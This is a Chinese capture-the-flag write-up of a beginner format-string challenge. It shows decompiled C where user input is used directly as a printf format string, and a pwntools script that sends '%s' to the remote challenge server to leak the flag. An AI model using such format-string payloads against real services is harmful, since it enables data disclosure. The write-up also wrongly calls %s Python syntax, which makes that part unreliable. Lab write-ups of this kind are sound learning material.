# 挑战简介
可能上一题没太看懂？来看下基础吧

# 思路
简单的格式化字符串入门，来分析源码  
```
unsigned __int64 flagishere()
{
  FILE *stream; // [rsp+8h] [rbp-68h]
  char format; // [rsp+16h] [rbp-5Ah]
  char s; // [rsp+20h] [rbp-50h]
  unsigned __int64 v4; // [rsp+68h] [rbp-8h]

  v4 = __readfsqword(0x28u);
  stream = fopen("/ctfshow_flag", "r");
  if ( !stream )
  {
    puts("/ctfshow_flag: No such file or directory.");
    exit(0);
  }
  fgets(&s, 64, stream);
  printf("Enter your format string: ", 64LL);
  __isoc99_scanf("%9s", &format);
  printf("The flag is :");
  printf(&format, &s);
  return __readfsqword(0x28u) ^ v4;
}
```
思路并不复杂，首先将flag的数据存入s字符串，而后读取我们输入的数据，存入format字符串  

很明显，由**"printf(&format, &s);"**这一句漏洞就诞生了  

%s，是python的printf语句中会用到的一个基础语法，用处在于引入变量，其类型是string  

更明确了,只要输入%s即可引用s变量了  

```
from pwn import *
from LibcSearcher import *
#context(arch = "amd64",os = 'linux',log_level = 'debug')

context(arch = "i386",os = 'linux',log_level = 'debug')

#io = process("./pwn")

io = remote('pwn.challenge.ctf.show',28248)

elf = ELF('D:\edge 下载\pwn')

io.send('%s')
io.interactive()
```
